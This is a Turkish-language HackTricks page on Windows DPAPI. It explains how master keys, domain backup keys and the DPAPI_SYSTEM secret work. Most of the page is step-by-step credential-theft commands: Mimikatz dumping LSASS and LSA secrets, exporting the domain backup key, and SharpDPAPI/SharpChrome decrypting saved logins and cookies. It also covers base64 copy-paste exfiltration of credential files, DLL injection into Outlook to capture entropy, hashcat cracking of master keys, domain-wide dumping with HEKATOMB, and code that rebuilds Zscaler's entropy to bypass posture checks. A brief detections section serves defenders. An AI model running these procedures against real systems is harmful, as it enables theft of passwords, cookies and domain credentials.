# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## DPAPI nedir

Data Protection API (DPAPI), Windows işletim sistemi içinde temel olarak **asimetrik özel anahtarların simetrik şifrelenmesi** için kullanılır ve önemli bir entropy kaynağı olarak kullanıcı veya sistem secrets değerlerinden yararlanır. Bu yaklaşım, geliştiricilerin verileri kullanıcının logon secrets değerlerinden türetilen bir anahtarla veya sistem şifrelemesi için sistemin domain authentication secrets değerleriyle şifrelemesine olanak tanıyarak şifreleme anahtarının korunmasını kendilerinin yönetmesi gerekliliğini ortadan kaldırır.

DPAPI'yi kullanmanın en yaygın yolu, uygulamaların verileri o anda logon olmuş process'in session'ı ile güvenli bir şekilde şifrelemesine ve şifresini çözmesine olanak tanıyan **`CryptProtectData` ve `CryptUnprotectData`** işlevleridir. Bu, şifrelenmiş verilerin yalnızca onları şifreleyen aynı kullanıcı veya sistem tarafından çözülebileceği anlamına gelir.

Ayrıca bu işlevler, şifreleme ve şifre çözme sırasında kullanılacak bir **`entropy` parametresi** de kabul eder. Bu nedenle, bu parametre kullanılarak şifrelenmiş bir şeyin şifresini çözmek için şifreleme sırasında kullanılan entropy değerinin aynısını sağlamanız gerekir.

### Users key generation

DPAPI, her kullanıcı için credentials değerlerine dayalı benzersiz bir anahtar (**`pre-key`** olarak adlandırılır) oluşturur. Bu anahtar, kullanıcının password'ünden ve diğer faktörlerden türetilir ve algoritma kullanıcı türüne bağlıdır, ancak sonuçta bir SHA1 olur. Örneğin domain kullanıcıları için **kullanıcının NTLM hash değerine bağlıdır**.

Bu özellikle ilgi çekicidir, çünkü bir attacker kullanıcının password hash değerini elde edebilirse şunları yapabilir:

- Herhangi bir API'ye ihtiyaç duymadan, o kullanıcının anahtarıyla **DPAPI kullanılarak şifrelenmiş tüm verilerin şifresini çözebilir**
- Geçerli DPAPI anahtarını oluşturmaya çalışarak **password'ü offline crack etmeyi** deneyebilir

Ayrıca bir kullanıcı DPAPI kullanarak bazı verileri her şifrelediğinde yeni bir **master key** oluşturulur. Verileri şifrelemek için gerçekte kullanılan anahtar bu master key'dir. Her master key'e onu tanımlayan bir **GUID** (Globally Unique Identifier) atanır.

Master key'ler, `{SID}` değerinin kullanıcının Security Identifier'ı olduğu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** dizininde saklanır. Master key, kullanıcının **`pre-key`** değeriyle ve kurtarma amacıyla bir **domain backup key** ile şifrelenmiş olarak saklanır (böylece aynı key, 2 farklı pass kullanılarak 2 kez şifrelenmiş şekilde saklanır).

Master key'i şifrelemek için kullanılan **domain key'in domain controller'larda bulunduğunu ve hiçbir zaman değişmediğini** unutmayın. Bu nedenle bir attacker domain controller'a erişebiliyorsa domain backup key'i alabilir ve domain içindeki tüm kullanıcıların master key'lerinin şifresini çözebilir.<sup>[[2]](#references)</sup>

Şifrelenmiş blob'lar, verileri şifrelemek için kullanılan master key'in **GUID** değerini header'larında içerir.

> [!TIP]
> DPAPI encrypted blob'lar **`01 00 00 00`** ile başlar.

Master key'leri bulun:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Bir kullanıcının bir grup Master Key'i şu şekilde görünür:

![DPAPI nedir - Kullanıcı anahtarı oluşturma: Bir kullanıcının bir grup Master Key'i şu şekilde görünür](<../../images/image (1121).png>)

### Machine/System key generation

Bu anahtar, makinenin verileri şifrelemesi için kullanılır. Yalnızca SYSTEM kullanıcısının erişebildiği özel bir anahtar olan **DPAPI_SYSTEM LSA secret** temel alınarak oluşturulur. Bu anahtar; makine düzeyindeki kimlik bilgileri veya sistem genelindeki secret'lar gibi sistemin kendisi tarafından erişilebilir olması gereken verileri şifrelemek için kullanılır.<sup>[[2]](#references)</sup>

Bu anahtarların **domain backup'ı yoktur**, bu nedenle yalnızca yerel olarak erişilebilirler:

- **Mimikatz**, şu komutu kullanarak LSA secret'larını dump ederek bu anahtara erişebilir: `mimikatz lsadump::secrets`
- Secret registry içinde saklanır; bu nedenle bir administrator, **erişmek için DACL izinlerini değiştirebilir**. Registry path'i: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Registry hive'larından offline extraction da mümkündür. Örneğin, hedefte administrator olarak hive'ları kaydedip exfiltrate edebilirsiniz:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Ardından analysis box'ınızda, hives içinden DPAPI_SYSTEM LSA secret'ını kurtarın ve machine-scope blob'larını (scheduled task password'ları, service credential'ları, Wi‑Fi profile'ları vb.) decrypt etmek için kullanın:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI Tarafından Korunan Veriler

DPAPI tarafından korunan kişisel veriler şunlardır:

- Windows kimlik bilgileri
- Internet Explorer ve Google Chrome parolaları ve otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalar için e-posta ve dahili FTP hesabı parolaları
- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için parolalar; şifreleme anahtarları dahil
- Uzak masaüstü bağlantıları ve .NET Passport parolaları ile çeşitli şifreleme ve kimlik doğrulama amaçları için kullanılan özel anahtarlar
- Credential Manager tarafından yönetilen ağ parolaları ve Skype, MSN messenger gibi CryptProtectData kullanan uygulamalardaki kişisel veriler
- Registry içindeki şifrelenmiş blob'lar
- ...

Sistem tarafından korunan veriler şunları içerir:
- Wifi parolaları
- Zamanlanmış görev parolaları
- ...

### Master key extraction seçenekleri

- Kullanıcının domain admin ayrıcalıkları varsa, domain içindeki tüm kullanıcı master key'lerini decrypt etmek için **domain backup key**'e erişebilir:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Yerel yönetici ayrıcalıklarıyla, tüm bağlı kullanıcıların DPAPI ana anahtarlarını ve SYSTEM anahtarını çıkarmak için **LSASS belleğine erişmek** mümkündür.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Kullanıcı local admin privileges'a sahipse, machine master keys'leri decrypt etmek için **DPAPI_SYSTEM LSA secret**'a erişebilir:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Kullanıcının parolası veya NTLM hash'i biliniyorsa, **kullanıcının master key'lerini doğrudan decrypt edebilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Kullanıcı olarak bir session içindeyseniz, **master key'leri RPC kullanarak decrypt etmek için backup key'i** DC'den istemek mümkündür. Local admin iseniz ve kullanıcı login olmuşsa, bunun için **session token'ını steal edebilirsiniz**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault'ları Listele
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI Şifrelenmiş Verilere Erişim

### DPAPI Şifrelenmiş Verileri Bulma

Kullanıcıların korunan yaygın dosyaları şu konumlardadır:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Yukarıdaki yollarda `\Roaming\` yerine `\Local\` kullanarak da kontrol edin.

Enumeration örnekleri:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI), dosya sistemi, registry ve B64 blob'larında DPAPI ile şifrelenmiş blob'ları bulabilir:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Şunu unutmayın: aynı repodaki [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI), cookies gibi DPAPI ile korunan hassas verilerin şifresini çözmek için kullanılabilir.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron quick recipes (SharpChrome)

- Mevcut kullanıcı, kaydedilmiş giriş bilgileri/cookies için etkileşimli şifre çözme (kullanıcı bağlamında çalıştırıldığında, ek anahtar kullanıcının Credential Manager’ından çözüldüğü için Chrome 127+ app-bound cookies ile de çalışır):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Yalnızca dosyalara sahip olduğunuzda offline analiz. Önce profilin "Local State" dosyasından AES state key'i çıkarın, ardından cookie DB'yi şifresini çözmek için kullanın:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key (PVK) ve hedef host üzerinde admin olduğunuzda domain genelinde/uzaktan triage:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Bir kullanıcının DPAPI prekey/credkey bilgisine (LSASS üzerinden) sahipseniz, password cracking işlemini atlayıp profil verilerinin şifresini doğrudan çözebilirsiniz:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notlar
- Daha yeni Chrome/Edge derlemeleri belirli cookie'leri "App-Bound" encryption kullanarak depolayabilir. Bu belirli cookie'lerin offline decryption işlemi, ek app-bound key olmadan mümkün değildir; bu anahtarı otomatik olarak almak için SharpChrome'u hedef kullanıcının context'i altında çalıştırın. Aşağıda referans verilen Chrome security blog gönderisine bakın.<sup>[[5]](#references)</sup>

### Erişim anahtarları ve veriler

- **Mevcut oturumdaki DPAPI ile şifrelenmiş dosyalardan credential'ları almak için SharpDPAPI kullanın:**
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Şifre bilgilerini alın**; şifrelenmiş veriler ve guidMasterKey gibi.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Masterkey'lere erişim**:

RPC kullanarak **domain backup key** isteyen bir kullanıcının masterkey'inin şifresini çözün:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** aracı, masterkey decryption için şu argümanları da destekler (`/rpc` kullanarak domain backup key alınabildiğine, `/password` ile düz metin parola kullanılabildiğine veya bir DPAPI domain private key dosyası belirtmek için `/pvk` kullanılabildiğine dikkat edin...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Bir masterkey kullanarak verilerin şifresini çözme**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** aracı, `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme işlemleri için şu argümanları da destekler (`/rpc` kullanılarak domains backup key alınabildiğine, düz metin parola kullanmak için `/password`, DPAPI domain private key dosyası belirtmek için `/pvk` ve mevcut kullanıcı oturumunu kullanmak için `/unprotect` kullanılabildiğine dikkat edin...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey’i doğrudan kullanma (parola gerekmez)

LSASS’ı dump edebilirseniz Mimikatz, düz metin parolayı bilmeden kullanıcının masterkey’lerini decrypt etmek için kullanılabilecek, oturum başına bir DPAPI key’i çoğu zaman açığa çıkarır. Bu değeri doğrudan tooling’e geçin:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **mevcut kullanıcı oturumunu** kullanarak bazı verilerin şifresini çözün:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py ile offline decryption

Victim kullanıcının SID'sine ve password'üne (veya NT hash'ine) sahipseniz, Impacket'in dpapi.py aracını kullanarak DPAPI masterkey'lerini ve Credential Manager blob'larını tamamen offline olarak decrypt edebilirsiniz.<sup>[[10]](#references)[[11]](#references)</sup>

- Disk üzerindeki artefact'ları belirleyin:
- Credential Manager blob(lar)ı: %APPDATA%\Microsoft\Credentials\<hex>
- Eşleşen masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- File transfer tooling sorun çıkarıyorsa, dosyaları host üzerinde base64 ile encode edin ve çıktıyı kopyalayın:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Kullanıcının SID'si ve password/hash'i ile masterkey'in şifresini çözün:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Şifresi çözülmüş masterkey'i kullanarak credential blob'un şifresini çözün:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Bu workflow, Windows Credential Manager kullanan uygulamalar tarafından kaydedilmiş domain kimlik bilgilerini ve yönetici hesaplarını (ör. `*_adm`) sıklıkla kurtarır.

---

### İsteğe Bağlı Entropy ("Third-party entropy") İşleme

Bazı uygulamalar `CryptProtectData` işlevine ek bir **entropy** değeri gönderir. Bu değer olmadan, doğru masterkey bilinse bile blob decrypt edilemez. Bu nedenle, bu şekilde korunan kimlik bilgilerini hedeflerken entropy elde etmek kritik önem taşır (ör. Microsoft Outlook ve bazı VPN client'ları).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022), hedef process içindeki DPAPI işlevlerine hook ekleyen ve sağlanan isteğe bağlı entropy değerlerini transparan şekilde kaydeden user-mode bir DLL'dir. EntropyCapture'ı `outlook.exe` veya `vpnclient.exe` gibi process'lere karşı **DLL-injection** mode'unda çalıştırmak, her entropy buffer'ını çağıran process ve blob ile eşleyen bir dosya oluşturur. Yakalanan entropy daha sonra verilerin decrypt edilmesi için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`) ile birlikte kullanılabilir.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Masterkey’leri offline olarak kırma (Hashcat ve DPAPISnoop)

Microsoft, Windows 10 v1607 (2016) ile birlikte **context 3** masterkey formatını tanıttı. `hashcat` v6.2.6 (Aralık 2023), kullanıcı parolalarının doğrudan masterkey dosyasından GPU-accelerated olarak kırılmasına olanak tanıyan **22100** (DPAPI masterkey v1 context), **22101** (context 1) ve **22102** (context 3) hash-modes’larını ekledi. Bu nedenle saldırganlar hedef sistemle etkileşime girmeden word-list veya brute-force saldırıları gerçekleştirebilir.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) bu süreci otomatikleştirir:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Araç ayrıca Credential ve Vault blob'larını ayrıştırabilir, bunları kırılmış anahtarlarla şifresini çözebilir ve cleartext parolaları dışa aktarabilir.<sup>[[8]](#references)</sup>


### Diğer makine verilerine erişim

**SharpDPAPI ve SharpChrome** araçlarında uzak bir makinenin verilerine erişmek için **`/server:HOST`** seçeneğini belirtebilirsiniz. Elbette bu makineye erişebilmeniz gerekir ve aşağıdaki örnekte **domain backup encryption key'in bilindiği** varsayılmıştır:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP directory'deki tüm kullanıcıları ve bilgisayarları ve domain controller backup key'i RPC üzerinden otomatik olarak çıkaran bir araçtır. Script daha sonra tüm bilgisayarların IP adreslerini çözer ve tüm kullanıcıların DPAPI blob'larını almak için her bilgisayarda smbclient çalıştırır; ardından domain backup key ile her şeyin şifresini çözer.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'ten çıkarılan bilgisayar listesiyle, daha önce bilmeseniz bile her alt ağı bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan secret'ları otomatik olarak dump edebilir. 2.x sürümü şunları sunmuştur:<sup>[[9]](#references)</sup>

* Yüzlerce host'tan blob'ların paralel olarak toplanması
* **context 3** masterkey'lerinin parse edilmesi ve otomatik Hashcat cracking entegrasyonu
* Chrome "App-Bound" şifreli cookie'leri için destek (sonraki bölüme bakın)
* Endpoint'leri tekrar tekrar poll etmek ve yeni oluşturulan blob'ları diff etmek için yeni bir **`--snapshot`** modu

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop), masterkey/credential/vault dosyaları için Hashcat/JtR formatlarında çıktı üretebilen ve isteğe bağlı olarak cracking işlemini otomatik olarak başlatabilen bir C# parser'ıdır. Windows 11 24H1'e kadar machine ve user masterkey formatlarını tamamen destekler.<sup>[[8]](#references)</sup>


## Yaygın tespitler

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve DPAPI ile ilişkili diğer dizinlerdeki dosyalara erişim.
- Özellikle **C$** veya **ADMIN$** gibi bir network share üzerinden.
- LSASS memory'ye erişmek veya masterkey'leri dump etmek için **Mimikatz**, **SharpDPAPI** veya benzer tooling kullanımı.
- Event **4662**: *An object üzerinde bir işlem gerçekleştirildi* – **`BCKUPKEY`** object'ine erişim ile ilişkilendirilebilir.
- Bir process *SeTrustedCredManAccessPrivilege* (Credential Manager) istediğinde Event **4673/4674**

---
### 2023-2025 güvenlik açıkları ve ecosystem değişiklikleri

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Network access'e sahip bir attacker, domain member'ını malicious bir DPAPI backup key almaya kandırabilir ve bu sayede user masterkey'lerinin decryption işlemini gerçekleştirebilir. Kasım 2023 cumulative update ile patch'lendi – administrator'lar DC'lerin ve workstation'ların tamamen patch'li olduğundan emin olmalıdır.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (Temmuz 2024), legacy DPAPI-only protection yerine user'ın **Credential Manager** altında saklanan ek bir key kullanmaya başladı. Cookie'lerin offline decryption işlemi artık hem DPAPI masterkey'ini hem de **GCM-wrapped app-bound key**'i gerektirir. SharpChrome v2.3 ve DonPAPI 2.x, user context ile çalışırken ek key'i recover edebilir.<sup>[[5]](#references)</sup>


### Vaka İncelemesi: Zscaler Client Connector – SID'den Türetilen Custom Entropy

Zscaler Client Connector, `C:\ProgramData\Zscaler` altında çeşitli configuration dosyaları (`config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp` gibi) saklar. Her dosya **DPAPI (Machine scope)** ile encrypt edilir; ancak vendor, disk üzerinde saklanmak yerine *runtime'da hesaplanan* **custom entropy** sağlar.<sup>[[1]](#references)</sup>

Entropy iki öğeden yeniden oluşturulur:

1. `ZSACredentialProvider.dll` içine gömülmüş hard-coded bir secret.
2. Configuration'ın ait olduğu Windows account'un **SID**'si.

DLL tarafından uygulanan algorithm şuna eşdeğerdir:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Çünkü sır, diskten okunabilen bir DLL içine gömülü olduğundan, **SYSTEM yetkilerine sahip herhangi bir local attacker, herhangi bir SID için entropy'yi yeniden oluşturabilir** ve blob'ları offline olarak decrypt edebilir:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption, her **device posture check** öğesini ve beklenen değerini içeren eksiksiz JSON configuration'ı ortaya çıkarır; bu bilgiler, client-side bypass girişimlerinde çok değerlidir.

> TIP: diğer şifrelenmiş artefact'lar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropy** olmadan (`16` sıfır byte) korunur. Bu nedenle SYSTEM privileges elde edildikten sonra `ProtectedData.Unprotect` ile doğrudan decrypt edilebilir.

## References

- [1] [Synacktiv – zero trust'ınıza güvenmeli misiniz? Zscaler posture check'lerini bypass etme](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI'de güvenlik analizi ve data recovery](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz ve C++ ile DPAPI Encrypted Secrets okuma](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows'ta Chrome cookies güvenliğini iyileştirme](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy'nin basit şekilde extraction'ı](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking ve DC admin'e DPAPI decryption](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Kullanım ve seçenekler](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
